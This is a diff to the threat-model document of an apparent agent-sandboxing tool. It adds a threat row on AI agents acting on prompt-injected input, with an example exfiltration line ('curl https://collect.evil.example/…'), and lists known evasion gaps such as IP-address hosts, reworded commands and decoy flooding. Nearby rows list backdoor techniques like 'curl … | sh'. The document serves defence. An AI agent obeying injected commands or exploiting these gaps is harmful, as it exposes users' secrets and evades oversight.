@@ -65,6 +65,7 @@ sandboxes and `openmoat run` add today, or the planned answer from the
 | T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts, except a `curl` or `wget` that provably sends nothing, which defers like `WebFetch` (ADR-035; a download is that fetch plus the write of the file it saves, which the path rules decide), and MCP network to unlisted hosts, except a browser call that only opens a page of a domain name, which defers the same way (ADR-047); a URL is judged by every host a client may read it as reaching (the URL Standard's reading too) and by the URLs inside it; after a secret read, a URL carrying a long encoded value is denied (`encoded-egress`); `cloud-metadata` denies metadata and link-local services; `local-net` defers localhost to the agent's own prompt; `openmoat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host defers to the agent's own prompt (ADR-017, ADR-025); after a secret read, network and MCP calls in the same session need review (`session-taint`) | Host sandboxes allow only the policy's hosts; `openmoat run`, and host sandboxes with `sandbox.proxy_port`, go through `openmoat proxy` |
 | T13 | Publishing through a push: an injected agent commits a token or a CI workflow change and pushes, so the secret is published or CI runs the change with the repository's secrets | The push check ([POLICY.md §4.2](POLICY.md#42-the-push-check)) reads the commits a `git push` or `gh pr create` would send: a known token format or a brokered secret's value in an added line or a message denies (`push-secret`); a change to a `runs-later` file in a session that read untrusted content or a secret needs review (`push-runs-later`); a push it cannot check within 10 s or 8 MiB needs review (`push-unchecked`). Once pushed, from any machine, `openmoat policy check-diff` (the repository's GitHub Action runs it on pull requests) reports every changed file the policy protects and every added token, with the policy read as the base revision has it ([MERGE_CHECK.md](MERGE_CHECK.md), ADR-050); it reads paths and added lines, not what a program does | None: the push goes to a host the policy allows |
 | T14 | A backdoor in a pull request: what an agent (or a person, or a fork) adds to files every change edits, so that it runs once merged or in CI: a typo-squatted or off-registry dependency, an install script, a lockfile hash or source swapped for the same version, a workflow that runs a fork's code with the repository's secrets (`pull_request_target` with a head checkout, event fields expanded into scripts, unpinned actions, printed secrets), `curl … \| sh`, decoded code that runs, a `.pth` start-up file, a Dockerfile `ADD` of a URL, an encoded blob, a private key, a new host the code sends data to | `openmoat policy check-diff`'s content checks read each added line offline ([MERGE_CHECK.md](MERGE_CHECK.md#content-checks), ADR-055): a lockfile hash changed for the same version, a CI takeover, an author's text in a script, a printed secret, decoded code that runs, a `.pth` import and a private key outside tests are `deny`; the rest are `review`, one finding per new host the policy's network allow list does not name; levels per rule in `check_diff.levels`. It matches line shapes and text, not whole files or what a program does: a payload built at run time, a version that is merely young, and a workflow whose trigger was there before are not found by these checks | None: a pull request check |
+| T15 | Acting on injected input: a page, an issue body read with `gh` or an MCP result names a host, a path or a command, and the agent uses it (`curl https://collect.evil.example/…`, `chmod +x /tmp/helper`), or writes an instruction file the next session obeys | Where the host reports what a call returned (Claude Code `PostToolUse`), untrusted output leaves keyed fingerprints of its URL hosts, host-like words, outside paths and code-span commands, and a later shell command or write using one needs review (`injected-input`, naming the source), unless the policy allows that part on its own (ADR-057, [POLICY.md §4.1.2](POLICY.md#412-injected-input)); after any untrusted content, a write to an instruction or skills file (`CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.cursor/rules/**`, `.clinerules`, `.windsurfrules`, `.github/copilot-instructions.md`, `.github/instructions/**`, `.claude/skills`, `.agents/skills`) needs review (`session-taint`); a clean session edits them freely | None: what the agent is told is not visible to the OS |
 
 ## 4. Out of scope
 
@@ -73,12 +74,26 @@ sandboxes and `openmoat run` add today, or the planned answer from the
   provenance attestations (`gh attestation verify`), which show where an artefact was
   built, not that the pipeline was sound.
 - Attacks on the model provider, and agents that run in a vendor's cloud.
-- Prompt-injection detection in text. OpenMoat governs actions, not intent.
+- Prompt-injection detection in text. OpenMoat governs actions, not intent: it links
+  an action to the untrusted output it uses (T15), and never judges what the text means.
 
 ## 5. Known limitations
 
 These hold for the current code. Each is a design consequence or a tracked gap, not
 something OpenMoat claims to stop.
+
+- **Injected input is linked only where the host reports output, and only exactly.**
+  - Only Claude Code (and the Continue CLI, which runs Claude Code's hooks) reports what a
+    call returned. On every other host a planted host, path or command is not linked to
+    the later call that uses it, and only session taint applies.
+  - Matches are exact: a host written as an IP address or another subdomain, a reworded
+    command, or a relative path is not linked.
+  - A command in plain prose is linked by its hosts and paths only.
+  - Content that floods the bounds with decoys pushes a planted token out: 256 tokens per
+    output, 4096 per session, the first 1 MiB.
+  - A fetch, search or MCP call to a planted host is the host's prompt to decide.
+  - Until `openmoat init` adds the `PostToolUse` entry after an upgrade, nothing is kept
+    (ADR-057).
 
 - **MCP servers start before OpenMoat sees a call.** A host starts its MCP servers when
   a session begins, outside every sandbox. For a server not run through `openmoat mcp
